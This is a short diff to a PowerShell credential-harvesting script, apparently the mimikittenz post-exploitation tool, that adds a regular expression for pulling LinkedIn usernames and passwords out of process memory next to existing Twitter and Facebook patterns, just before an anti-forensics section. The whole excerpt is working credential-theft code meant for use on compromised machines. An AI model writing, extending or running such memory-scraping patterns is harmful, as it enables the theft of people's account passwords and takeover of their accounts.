@@ -493,6 +493,8 @@ Add-Type -TypeDefinition $Source2 -Language CSharp -CompilerParameters $inmem
     [mimikittenz.MemProcInspector]::AddRegex("Twitter","username_or_email%5D=.{1,42}&session%5Bpassword%5D=.{1,22}&remember_me=")
     #Facebook
     [mimikittenz.MemProcInspector]::AddRegex("Facebook","lsd=.{1,10}&email=.{1,42}&pass=.{1,22}&default_persistent=")
+    #LinkedIN
+    [mimikittenz.MemProcInspector]::AddRegex("LinkedIN","session_key=.{1,50}&session_password=.{1,50}&isJsEnabled")
 
 #Anti-Forensics
 
